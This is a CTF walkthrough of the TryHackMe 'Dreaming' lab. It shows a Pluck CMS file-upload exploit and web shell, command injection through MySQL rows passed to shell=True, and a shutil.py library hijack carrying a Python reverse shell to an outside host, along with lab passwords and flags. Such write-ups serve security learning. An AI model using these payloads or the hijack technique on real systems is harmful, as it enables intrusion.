# 🌙 TryHackMe — Dreaming

> **Web Enumeration | Pluck CMS | File Upload RCE | Credential Discovery | MySQL Enumeration | Command Injection | Linux Privilege Escalation**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![OS](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555)
![Web Server](https://img.shields.io/badge/Web-Apache%202.4.41-d22128?style=flat-square&labelColor=555555)
![CMS](https://img.shields.io/badge/CMS-Pluck%204.7.13-6f42c1?style=flat-square&labelColor=555555)
![Vulnerability](https://img.shields.io/badge/Vulnerability-RCE%20%7C%20Command%20Injection-e63946?style=flat-square&labelColor=555555)

---

## 📋 Overview

**Dreaming** is a TryHackMe Linux machine that demonstrates a multi-stage attack chain beginning with web enumeration and ending with command execution as another Linux user.

The initial enumeration revealed an Apache web server running on port `80` and SSH on port `22`.

Directory enumeration exposed an `/app/` directory containing **Pluck CMS 4.7.13**.

Researching this version of Pluck revealed a known authenticated file-upload vulnerability. The public exploit was used to upload a PHP web shell and obtain initial command execution on the target.

From the web shell, interesting files in `/opt` were discovered. One of these files contained credentials for the Pluck application, while another contained MySQL-related information.

SSH access was then obtained as the `lucien` user.

After obtaining the user shell, `sudo -l` revealed that `lucien` could execute:

```text
/usr/bin/python3 /home/death/getDreams.py
```

as the ```death``` user without a password.

The ```/opt/getDreams.py``` source showed that database-controlled values were eventually passed to:
```
subprocess.check_output(..., shell=True)
```
This created a command-injection path through the MySQL ```dreams``` table.

---

# 🎯 Objectives
- Enumerate the target
- Identify exposed services
- Enumerate web directories
- Discover the Pluck CMS installation
- Identify the Pluck version
- Research the available vulnerability
- Exploit the authenticated file-upload vulnerability
- Obtain a web shell
- Enumerate files on the system
- Discover application credentials
- Obtain SSH access as ```lucien```
- Retrieve the ```lucien``` flag
- Enumerate sudo privileges
- Analyze ```getDreams.py```
- Enumerate the MySQL database
- Identify the ```dreams``` table
- Manipulate database-controlled input
- Demonstrate command injection in the context of ```death```

---

# 🔎 1. Initial Reconnaissance

I started with an Nmap service and version scan:
```
nmap -sV -sC 10.48.156.253
```
The scan identified two open TCP ports:
```
22/tcp   open   ssh
80/tcp   open   http
```
SSH was running:
```
OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
```
The HTTP service was:
```
Apache httpd 2.4.41 (Ubuntu)
```
Nmap also identified the default Apache page.

<img width="792" height="347" alt="1" src="https://github.com/user-attachments/assets/6d6cb995-db62-4de6-8474-ddfec04b38ae" />

---

# 🌐 2. Web Enumeration

I accessed the web server:
```
http://10.48.156.253
```
The server returned the standard:
```
Apache2 Ubuntu Default Page
```

<img width="1032" height="568" alt="2" src="https://github.com/user-attachments/assets/95e5b687-6aa9-410d-9a41-ce37f9f36f8c" />

Since the default page did not expose an obvious application, I performed directory enumeration using Gobuster.
```
gobuster dir -u http://10.48.156.253/ -w /usr/share/wordlists/dirb/common.txt
```
The scan returned several interesting paths:
```
.htaccess       403
.htpasswd       403
.hta            403
app/            301
index.html      200
server-status   403
```
The most interesting result was:
```
/app/
```
<img width="817" height="418" alt="3" src="https://github.com/user-attachments/assets/e13ee8f5-22d8-4258-bceb-a7f7a51462d9" />

---

# 📂 3. Enumerating ```/app/```

I accessed:
```
http://10.48.156.253/app/
```
Directory listing was enabled.

The directory contained:
```
pluck-4.7.13/
```
The version immediately stood out:
```
Pluck CMS 4.7.13
```

---

# 🔍 4. Identifying the Pluck CMS Version

I accessed the Pluck installation:
```
http://10.48.156.253/app/pluck-4.7.13/
```
The login page clearly identified the application as:
```
pluck 4.7.13
```
At this point, I had identified both the application and its exact version.

<img width="665" height="304" alt="3-1" src="https://github.com/user-attachments/assets/f442c71f-6309-4643-ad5e-97ba039c88a6" />

---

# 🧪 5. Searching for a Public Exploit

I used SearchSploit to search for vulnerabilities affecting this version:
```
searchsploit pluck 4.7.13
```
The search returned:
```
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)
```

The exploit was:
```
49909.py
```
The exploit information identified:
```
CVE-2020-29607
```
I copied the exploit locally:
```
searchsploit -m 49909
```
This produced:
```
49909.py
```

<img width="1235" height="635" alt="4-2" src="https://github.com/user-attachments/assets/23205dfe-ce6e-451e-b1b5-26400993882a" />

---

# 🔐 6. Exploiting Pluck CMS

The exploit required the Pluck login password.

I executed:
```
python3 49909.py 10.48.156.253 80 "password" "/app/pluck-4.7.13"
```
The exploit reported:
```
Authentication was successful, uploading webshell
```
and returned the uploaded shell location:
```
http://10.48.156.253:80/app/pluck-4.7.13/files/shell.phar
```

<img width="694" height="141" alt="5" src="https://github.com/user-attachments/assets/95365345-8795-42bd-a2d5-cdd63f352a6b" />

---

# 💻 7. Obtaining the Web Shell

Opening the uploaded file resulted in a command shell.

The shell prompt was:
```
p0wny@shell
```
The current directory was:
```
/app/pluck-4.7.13/files
```
This confirmed successful remote command execution on the target.

<img width="828" height="574" alt="5-2" src="https://github.com/user-attachments/assets/dacb35ba-96e5-4add-ae00-7add6bd10dc3" />

---

# 🔎 8. Enumerating ```/opt```

I inspected the ```/opt``` directory:
```
ls -la /opt
```
Two interesting Python scripts were present:
```
getDreams.py
test.py
```
The permissions were:
```
-rwxrw-r-- 1 death  death  getDreams.py
-rwxr-xr-x 1 lucien lucien test.py
```

<img width="759" height="541" alt="6" src="https://github.com/user-attachments/assets/78102ea2-4abb-4541-83b9-4889c9b242d4" />

---

# 🔑 9. Examining ```test.py```

I inspected the second Python script:
```
cat /opt/test.py
```
The script contained a password:
```
password = "HeyLucien#@1999!"
```
The script attempted to authenticate against:
```
http://127.0.0.1/app/pluck-4.7.13/login.php
```
This suggested that the password belonged to the ```lucien``` user or was at least associated with the local Pluck installation.

---

# 🖥️ 10. SSH Access as Lucien

Using the discovered credentials, I connected through SSH:
```
ssh lucien@10.48.156.253
```
The connection was successful.

I verified the current user:
```
id
```
The result showed:
```
uid=1000(lucien)
gid=1000(lucien)
```

<img width="655" height="125" alt="6-2" src="https://github.com/user-attachments/assets/f6dd2e0e-3013-4268-934d-acb2d90e966d" />
<img width="752" height="77" alt="6-3" src="https://github.com/user-attachments/assets/4d49e5a9-12e7-4e25-9902-6d7b8c6b4105" />

---

# 🚩 11. Retrieving the Lucien Flag

I listed the home directory:
```
ls
```
The file:
```
lucien_flag.txt
```
was present.

I read it with:
```
cat lucien_flag.txt
```
The flag was:
```
THM{TH3_L1BR4R1AN}
```

<img width="396" height="114" alt="7" src="https://github.com/user-attachments/assets/c527e884-d628-4c53-8de9-22ca13cbbc99" />

---

# 🔐 12. Enumerating Sudo Permissions

After obtaining a normal user shell, I checked sudo permissions:
```
sudo -l
```
The important result was:
```
User lucien may run the following commands:

(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```
This means:
```
lucien
   │
   └── sudo
         │
         ▼
     Python 3
         │
         ▼
   getDreams.py
         │
         ▼
       death
```
The script could be executed as the ```death``` user without entering a password.

<img width="1014" height="121" alt="8" src="https://github.com/user-attachments/assets/ab77c997-aade-41d6-be39-a329cb41b6ae" />

---

# 🧩 13. Understanding getDreams.py

There was another copy of the script available in:
```
/opt/getDreams.py
```
I inspected it:
```
cat /opt/getDreams.py
```
The script imported:
```
import mysql.connector
import subprocess
```
It connected to a MySQL database named:
```
library
```
and queried:
```
SELECT dreamer, dream FROM dreams;
```
The important behavior was that database values were later incorporated into a shell command.

Conceptually:
```
command = f"echo {dreamer} + {dream}"
subprocess.check_output(command, text=True, shell=True)
```
The important security issue is:
```
Database-controlled input
        ↓
String construction
        ↓
Shell command
        ↓
shell=True
```
This creates a **command injection** opportunity.

<img width="770" height="526" alt="8-2" src="https://github.com/user-attachments/assets/bda3e1cd-6c87-4264-969d-c4e767e6e48a" />

---

# 📜 14. Checking Bash History

I inspected the user's Bash history:
```
cat .bash_history
```
The history contained MySQL-related commands.

It also exposed the password used to connect to MySQL:
```
lucien42DBPASSWORD
```
This demonstrated another important post-exploitation technique:

> **Always inspect shell history for credentials, commands, configuration paths, and previously used services.**

<img width="658" height="428" alt="8-3" src="https://github.com/user-attachments/assets/325f6ce5-6e13-405e-8887-4689ab09638a" />

# 🗄️ 15. Connecting to MySQL

Using the discovered credentials:
```
mysql -u lucien -p
```
I authenticated successfully to MySQL.

<img width="707" height="246" alt="9" src="https://github.com/user-attachments/assets/3f182e34-f0c8-4f5e-a5de-d2da5b3e3fbf" />

I enumerated the available databases:
```
SHOW DATABASES;
```
The database:
```
library
```
was present.

---

# 📚 16. Enumerating the Library Database

I selected the database:
```
USE library;
```
Then listed the tables:
```
SHOW TABLES;
```
The database contained:
```
dreams
```

---

# 🔎 17. Enumerating the ```dreams``` Table

I queried the table:
```
SELECT * FROM dreams;
```
The table contained:
```
Dreamer	  |  Dream
Alice	    |  Flying in the sky
Bob	      |  Exploring ancient ruins
Carol	    |  Becoming a successful entrepreneur
Dave	    |  Becoming a professional musician
```
The important observation was that these values were later processed by ```getDreams.py```.

Therefore:
```
MySQL database
      ↓
dreams table
      ↓
dream field
      ↓
getDreams.py
      ↓
shell command
```
This created a potential path for command injection.

<img width="571" height="697" alt="10" src="https://github.com/user-attachments/assets/d493226e-eee9-4fe3-b7e6-8e41ddbc54e9" />

---

# 💉 18. Testing Command Injection

I inserted a controlled value into the database:
```
INSERT INTO dreams VALUES ("Hacker", "ls -la");
```
The insertion was successful.
```
Query OK, 1 row affected
```
The database now contained:
```
Hacker | ls -la
```

<img width="565" height="269" alt="12" src="https://github.com/user-attachments/assets/c6f353a5-d43d-4ee2-942f-db887eb600f0" />

---

# ⚙️ 19. Triggering the Injection

I executed the privileged script:
```
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```
The script printed the database contents:
```
Alice + Flying in the sky
Bob + Exploring ancient ruins
Carol + Becoming a successful entrepreneur
Dave + Becoming a professional musician
Hacker + ls -la
```
The important finding is that attacker-controlled database content reaches a shell command executed by:
```
death
```
This demonstrates the command-injection vulnerability.

<img width="760" height="175" alt="12-2" src="https://github.com/user-attachments/assets/9eb98da0-a7fc-4a74-b2fc-d63dff700818" />

At this point, we know that the `dreams` table is controlled by the MySQL database and that `getDreams.py` processes the values retrieved from it.

The script constructs a shell command using the database values. Since the command is executed with `shell=True`, shell metacharacters can be interpreted.

To verify command injection, I inserted a payload using `&&`:

```sql
INSERT INTO dreams VALUES ("Hacker", "&& ls -la");
```
The record was successfully inserted:
```
Query OK, 1 row affected
```

<img width="494" height="55" alt="12-3" src="https://github.com/user-attachments/assets/956c7c32-6fb0-48f3-9fa1-3b7bc5dac145" />

I then executed the vulnerable Python script as the death user:
```
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```
The output showed that ls -la was executed:
```
Hacker +

total 44
drwxr-xr-x 5 lucien lucien 4096 ...
drwxr-xr-x 6 root   root   4096 ...
-rw-r--r-- 1 lucien lucien  684 .bash_history
-rw-r--r-- 1 lucien lucien  220 .bash_logout
-rw-r--r-- 1 lucien lucien 3771 .bashrc
...
-rw-rw---- 1 lucien lucien 696 .mysql_history
...
```

<img width="749" height="435" alt="12-4" src="https://github.com/user-attachments/assets/eea43f02-592b-4755-ae42-6a475504e0e6" />

**Why this works**

The vulnerable application effectively builds a command similar to:
```
command = f"echo {dreamer} + {dream}"
```
Because the command is passed to:
```
subprocess.check_output(command, text=True, shell=True)
```
shell operators such as:
```
&&
$(...)
;
```
can alter the command execution flow.

This means that database-controlled input can become operating-system commands.

---

# ⚙️ 20. Reading getDreams.py

After confirming command execution, I used the same technique to read the Python script:
```
INSERT INTO dreams VALUES ("Hacker", "&& cat /home/death/getDreams.py");
```

<img width="673" height="52" alt="12-5" src="https://github.com/user-attachments/assets/68ee79fc-cdfc-4334-b71c-089b2044b43d" />

Running the script again:
```
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```
returned the contents of the Python script.

The important section contained the MySQL credentials:
```
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "!mementoMORI666!"
DB_NAME = "library"
```

<img width="744" height="563" alt="12-6" src="https://github.com/user-attachments/assets/71546459-2399-4937-bf48-160f5e569f20" />

---

# ⚙️ 21. Switching to the ```death``` User

The discovered password could be used to switch from ```lucien``` to ```death```:
```
su death
```
After entering the discovered password:
```
death@ip-10-48-156-253:/home/lucien$
```
I verified the current account:
```
id
```
Output:
```
uid=1001(death) gid=1001(death) groups=1001(death)
```
We now have access to the ```death``` account.

<img width="445" height="102" alt="13" src="https://github.com/user-attachments/assets/7fbf9f05-4e87-4f33-b2ea-811448ebff44" />

---

# 🚩 22. Obtaining the Death Flag

I listed the contents of the ```death``` home directory:
```
cd
ls -la
```
The directory contained:
```
.bash_history
.bash_logout
.bashrc
.cache
death_flag.txt
getDreams.py
.local
.mysql_history
.profile
.viminfo
.wget-hsts
```
The flag was stored in:
```
/home/death/death_flag.txt
```
I read it with:
```
cat death_flag.txt
THM{1M_3R34_3_TH3_M3}
```

<img width="640" height="308" alt="14" src="https://github.com/user-attachments/assets/2ae14efd-9b58-4d3b-8e31-2bcdb29e7b28" />

---

# 🔎 23. Enumerating Other Users

After obtaining the ```death``` flag, I checked ```/home``` for other user accounts:
```
ls -la /home
```
The output revealed another interesting user:
```
drwxr-xr-x 4 death    death    4096 ... death
drwxr-xr-x 5 lucien   lucien   4096 ... lucien
drwxr-xr-x 3 morpheus morpheus 4096 ... morpheus
drwxr-xr-x 4 ubuntu   ubuntu   4096 ... ubuntu
```
The ```morpheus``` account was particularly interesting because it contained another user's home directory.

<img width="538" height="134" alt="15" src="https://github.com/user-attachments/assets/c84e3e95-43df-4ae7-84fd-920132229e5a" />

---

# 🧑‍💻 24. Investigating the ```morpheus``` Directory

I entered the ```morpheus``` home directory:
```
cd /home/morpheus
ls -la
```
The directory contained:
```
.bash_history
.bash_logout
.bashrc
.cache
.kingdom
.local
.morpheus_flag.txt
.profile
.restore.py
.selected_editor
```
Most importantly:
```
restore.py
kingdom
morpheus_flag.txt
```

<img width="679" height="361" alt="16" src="https://github.com/user-attachments/assets/c4df5cd5-b425-42ea-b9da-a5c0fb74a788" />

---

# 🔍 25. Analyzing ```restore.py```

I inspected the backup script:
```
cat restore.py
```
The script contained:
```
from shutil import copy2 as backup

src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"

backup(src_file, dst_file)

print("The kingdom backup has been done!")
```
The important part is:
```
from shutil import copy2 as backup
```
The script imports ```copy2``` from the Python ```shutil``` module.

This led to checking whether the imported Python module could be modified.

---

# 🔎 26. Finding ```shutil.py```

I searched the filesystem for ```shutil.py```:
```
find / -name shutil* 2>/dev/null
```
The search returned:
```
/usr/lib/python3.8/shutil.py
/usr/lib/python3.8/__pycache__/shutil.cpython-38.pyc
/usr/lib/python3.8/lib-dynload/...
```
I then checked the permissions of the Python module:
```
ls -la /usr/lib/python3.8/shutil.py
```
The result showed:
```
-rw-rw-r-- 1 root death 51474 Mar 18 2025 /usr/lib/python3.8/shutil.py
```

<img width="585" height="134" alt="17" src="https://github.com/user-attachments/assets/d3f5f2db-0b27-4397-b4b3-4da9df10976c" />

**Important Finding**
The file is owned by:
```
root death
```
and the group ```death``` has write permission:
```
-rw-rw-r--
     ^^
```
Therefore, the ```death``` user can modify a Python library file that can potentially be imported by programs running with another user's privileges.

This creates a **Python library hijacking / import manipulation** opportunity.

---

# 🐍 27. Modifying ```shutil.py```

I opened the Python library:
```
nano /usr/lib/python3.8/shutil.py
```

<img width="534" height="27" alt="18-1" src="https://github.com/user-attachments/assets/beae4492-0247-42d0-82ab-44fec0bd3a38" />

I added a Python reverse-shell payload to the module.

The payload connects back to my Kali machine:
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.132.194",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

<img width="1198" height="93" alt="18-2" src="https://github.com/user-attachments/assets/144981f1-b376-4c36-aed4-6b73742802e4" />

The complete payload used in the lab is also available in the uploaded ```shutil.py``` file.


**How the payload works**
```
socket.socket(...)
```
Creates a TCP socket.
```
s.connect(("192.168.132.194",1337))
```
Connects back to the Kali machine on port ```1337```.
```
os.dup2(...)
```
Redirects:

- stdin
- stdout
- stderr
to the network socket.

Finally:
```
pty.spawn("sh")
```
creates an interactive shell.

---

# 🎧 28. Starting the Listener

On the Kali machine, I started a Netcat listener:
```
nc -lvnp 1337
```
Output:
```
listening on [any] 1337 ...
```
The listener waits for the target machine to connect back.

---

# 💻 29. Obtaining the morpheus Shell

When the backup process imported the modified shutil module, the reverse-shell code executed.

The listener received a connection:
```
connect to [192.168.132.194] from (UNKNOWN) [10.48.155.217] 53028
```
I then tested the shell:
```
ls -la
```
The directory listing showed the morpheus user's files:
```
total 44
drwxr-xr-x 3 morpheus morpheus 4096 ...
drwxr-xr-x 6 root    root     4096 ...
-rw-r--r-- 1 morpheus morpheus  58 .bash_history
-rw-r--r-- 1 morpheus morpheus 220 .bash_logout
-rw-r--r-- 1 morpheus morpheus 3771 .bashrc
drwx------ 3 morpheus morpheus 4096 .cache
-rw-rw-r-- 1 morpheus morpheus  22 kingdom
drwxrwxr-x 3 morpheus morpheus 4096 .local
-rw-rw-r-- 1 morpheus morpheus  28 morpheus_flag.txt
-rw-r--r-- 1 morpheus morpheus 807 .profile
-rw-r--r-- 1 morpheus morpheus 180 restore.py
```
This confirms that the reverse shell was obtained in the ```morpheus``` context.

<img width="743" height="303" alt="19" src="https://github.com/user-attachments/assets/1bd7ab27-0758-4599-8dae-ba30ea163862" />

---

# 🚩 30. Obtaining the Morpheus Flag

Finally, I read:
```
cat morpheus_flag.txt
```
The flag was:
```
THM{DR34M5_5H4P3_TH3_W0RLD}
```

<img width="271" height="68" alt="20" src="https://github.com/user-attachments/assets/93c98e11-97bc-48c7-b795-8375e8ddf367" />
